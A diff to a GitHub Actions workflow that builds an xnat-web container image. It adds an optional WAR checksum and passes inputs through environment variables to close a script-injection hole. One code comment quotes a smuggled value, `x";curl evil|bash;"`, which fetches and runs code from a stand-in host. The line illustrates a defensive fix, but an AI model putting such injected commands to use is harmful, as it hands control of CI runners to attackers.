@@ -12,6 +12,10 @@ on:
       war_url:
         description: "Published WAR URL to wrap (JFrog libs-release)"
         required: true
+      war_sha256:
+        description: "Optional sha256 of the WAR, verified before unzip"
+        required: false
+        default: ""
       image_tag:
         description: "Image version tag, e.g. 1.9.3.5"
         required: true
@@ -43,9 +47,17 @@ jobs:
           password: ${{ secrets.GITHUB_TOKEN }}
 
       - name: Build (and optionally push) the non-root image
+        # Inputs are passed via env (not spliced into the script body), so a value
+        # like `x";curl evil|bash;"` is an inert string, not runner-side code.
+        env:
+          IMAGE_TAG: ${{ inputs.image_tag }}
+          WAR_URL: ${{ inputs.war_url }}
+          WAR_SHA256: ${{ inputs.war_sha256 }}
+          TOMCAT_IMAGE: ${{ inputs.tomcat_image }}
+          PUSH: ${{ inputs.push }}
+          REPO_OWNER: ${{ github.repository_owner }}
         run: |
-          bash docker/build.sh \
-            --image "ghcr.io/${{ github.repository_owner }}/xnat-web:${{ inputs.image_tag }}" \
-            --war-url "${{ inputs.war_url }}" \
-            --tomcat-image "${{ inputs.tomcat_image }}" \
-            ${{ inputs.push && '--push' || '' }}
+          args=(--image "ghcr.io/${REPO_OWNER}/xnat-web:${IMAGE_TAG}" --war-url "$WAR_URL" --tomcat-image "$TOMCAT_IMAGE")
+          [ -n "$WAR_SHA256" ] && args+=(--war-sha256 "$WAR_SHA256")
+          [ "$PUSH" = "true" ] && args+=(--push)
+          bash docker/build.sh "${args[@]}"
